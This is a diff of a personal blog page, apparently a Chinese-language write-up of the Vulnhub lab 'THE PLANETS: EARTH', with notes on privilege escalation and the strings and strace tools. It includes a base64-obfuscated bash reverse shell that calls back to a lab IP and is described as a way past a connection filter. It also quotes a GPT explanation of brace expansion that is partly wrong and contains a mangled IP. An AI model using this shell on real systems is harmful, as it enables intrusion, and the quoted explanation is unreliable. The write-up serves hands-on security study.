@@ -5,7 +5,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Salve || linux</title>
+    <title>Salve || vulnhub_learning</title>
     <meta name="author" content="TiAmo">
     <meta name="description" content="Buona notte ">
     <meta name="keywords" content=" ">
@@ -169,14 +169,14 @@
 <link rel="stylesheet" href="/css/post-body.css">
 <div class="article">
     <div>
-        <h1>linux </h1>
+        <h1>vulnhub_learning </h1>
     </div>
     <div class="info">
         <span class="date">
             <span class="icon">
                 <a-icon type="calendar" theme="filled" />
             </span>
-            2023/6/11
+            2023/8/12
         </span>
 
         
@@ -190,8 +190,8 @@
             
             <span class="tag">
                 
-                <a href="/tags/base" style=color:#00a596>
-                    base
+                <a href="/tags/vulnhub" style=color:#00bcd4>
+                    vulnhub
                 </a>
             </span>
             
@@ -200,84 +200,63 @@
     </div>
 
     <div class="content" v-pre>
-        <h1 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h1><h3 id="文件结构"><a href="#文件结构" class="headerlink" title="文件结构"></a>文件结构</h3><table>
-<thead>
-<tr>
-<th><code>/</code></th>
-<th>顶级目录是根文件系统，包含在挂载其他文件系统之前引导操作系统所需的所有文件，以及引导其他文件系统所需的文件。引导后，所有其他文件系统都作为根目录挂载在标准挂载点。</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>/bin</code></td>
-<td>包含基本的命令二进制文件。</td>
-</tr>
-<tr>
-<td><code>/boot</code></td>
-<td>由静态引导加载程序、内核可执行文件和引导 Linux 操作系统所需的文件组成。</td>
-</tr>
-<tr>
-<td><code>/dev</code></td>
-<td>包含设备文件，以便于访问连接到系统的每个硬件设备。</td>
-</tr>
-<tr>
-<td><code>/etc</code></td>
-<td>本地系统配置文件。已安装应用程序的配置文件也可以保存在此处。</td>
-</tr>
-<tr>
-<td><code>/home</code></td>
-<td>系统上的每个用户都有一个用于存储的子目录。</td>
-</tr>
-<tr>
-<td><code>/lib</code></td>
-<td>系统引导所需的共享库文件。</td>
-</tr>
-<tr>
-<td><code>/media</code></td>
-<td>外部可移动媒体设备（如 USB 驱动器）安装在此处。</td>
-</tr>
-<tr>
-<td><code>/mnt</code></td>
-<td>常规文件系统的临时挂载点。</td>
-</tr>
-<tr>
-<td><code>/opt</code></td>
-<td>可选文件（如第三方工具）可以保存在此处。</td>
-</tr>
-<tr>
-<td><code>/root</code></td>
-<td>根用户的主目录。</td>
-</tr>
-<tr>
-<td><code>/sbin</code></td>
-<td>此目录包含用于系统管理的可执行文件（二进制系统文件）。</td>
-</tr>
-<tr>
-<td><code>/tmp</code></td>
-<td>操作系统和许多程序使用此目录来存储临时文件。此目录通常在系统启动时清除，其他时间可能会删除，没有任何警告。</td>
-</tr>
-<tr>
-<td><code>/usr</code></td>
-<td>包含可执行文件、库、man 文件等。</td>
-</tr>
-<tr>
-<td><code>/var</code></td>
-<td>此目录包含可变数据文件，例如日志文件、电子邮件收件箱、Web 应用程序相关文件、cron 文件等。</td>
-</tr>
-</tbody></table>
+        <p>记录一些在打靶学习的时候遇到的一些有意思的idea或者方法等</p>
 <span id="more"></span>
 
-<h3 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h3><table>
-<thead>
-<tr>
-<th><code>\d</code></th>
-<th>日期（6月&lt;&gt;日星期一）</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>&#96;\D</td>
-<td></td>
-</tr>
-</tbody></table>
+<h1 id="THE-PLANETS-EARTH"><a href="#THE-PLANETS-EARTH" class="headerlink" title="THE PLANETS: EARTH"></a>THE PLANETS: EARTH</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/sainet/p/15638010.html">Vulnhub 靶场 THE PLANETS: EARTH - sainet - 博客园 (cnblogs.com)</a></p>
+<ul>
+<li><p>这个靶机不同于之前只扫描http协议，需要连httpx一起扫描</p>
+</li>
+<li><p>其中需要进行异或加密解密</p>
+</li>
+<li><p>RCE反弹shell的时候被禁用了远程连接，可以使用十六进制编码后直接绕过，或者base64，但是需要一点技巧：</p>
+<pre><code>bash -c &#39;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU2LjEwMS8yNTAwMSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39;
+</code></pre>
+<p>这里查询了一下这个逗号：</p>
+</li>
+</ul>
+<pre><code class="GPT">echo 后面直接跟着逗号 ,，这实际上是一种不常见但合法的写法，被称为 Brace Expansion（花括号扩展）。
+
+在 Bash 中，花括号 &#123;&#125; 可以用于创建一组字符串的扩展，其中逗号分隔每个字符串。这种写法在很多情况下可以用来生成一系列的值。
+这里的 echo 和 YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU1Ni4xMDEvMjUwMDEgMD4mMQ== 是一对值，逗号分隔了这两个值。在这个上下文中，它的目的似乎是将一个值（YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU1Ni4xMDEvMjUwMDEgMD4mMQ==）传递给 echo 命令。
+
+在子命令中，逗号 , 用于分隔多个子命令，以便按顺序执行它们。
+</code></pre>
+<ul>
+<li><p>靶机中提权时发现缺少二进制文件reset_root的触发器，需要进行调试查看，创建触发器</p>
+</li>
+<li><p>提权部分看到了两种调试工具：</p>
+<ul>
+<li><p>strings：<code>strings</code> 是一个在 Linux 和类 Unix 操作系统中的命令行工具，它用于从二进制文件中提取可打印的字符串。当您需要检查一个二进制文件（如可执行文件、库文件等）中是否包含文本信息，或者需要分析文件中的字符串时，可以使用 <code>strings</code> 命令。</p>
+<p>以下是一些常用的 <code>strings</code> 命令选项：</p>
+<ul>
+<li><code>-n length</code>：指定最小字符串长度。默认情况下，<code>strings</code> 提取长度至少为 4 个字符的字符串。</li>
+<li><code>-a</code>：显示所有的字符串，而不仅仅是可打印字符的字符串。</li>
+<li><code>-o</code>：将结果以字符串的偏移量（在文件中的位置）形式输出。</li>
+<li><code>-t format</code>：指定输出的字符串格式，可以是 d (十进制)、o (八进制)、x (十六进制)。</li>
+<li><code>-e encoding</code>：指定输入文件的字符编码。</li>
+<li><code>-h</code>：显示命令的帮助信息。</li>
+</ul>
+</li>
+<li><p>strace： <code>strace</code> 是一个在 Linux 和类 Unix 操作系统中的命令行工具，用于跟踪和记录应用程序执行期间的系统调用和信号。通过使用 <code>strace</code>，您可以查看一个程序与操作系统之间的交互，以及它执行过程中发生的系统调用、信号和其他相关信息。这对于诊断问题、分析性能瓶颈以及理解程序的行为非常有用。</p>
+<p>以下是一些常用的 <code>strace</code> 命令选项：</p>
+<ul>
+<li><code>-o file</code>：将跟踪信息输出到指定文件中，而不是输出到终端。</li>
+<li><code>-e trace</code>：指定要跟踪的系统调用。例如，<code>-e open,read</code> 只会跟踪 <code>open</code> 和 <code>read</code> 系统调用。</li>
+<li><code>-p pid</code>：跟踪一个已经运行的进程，而不是启动一个新的命令。</li>
+<li><code>-f</code>：同时跟踪子进程。对于多进程应用程序，这可以捕获整个进程树的系统调用。</li>
+<li><code>-s size</code>：限制输出的字符串长度，避免输出过长。</li>
+<li><code>-c</code>：统计系统调用和出错情况的统计信息。</li>
+<li><code>-h</code>：显示命令的帮助信息。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<p>strace -o output.txt ls -l</p>
+<p>这个命令将会跟踪 <code>ls -l</code> 命令的执行过程，并将跟踪信息输出到名为 <code>output.txt</code> 的文件中。</p>
+</blockquote>
 
     </div>
 
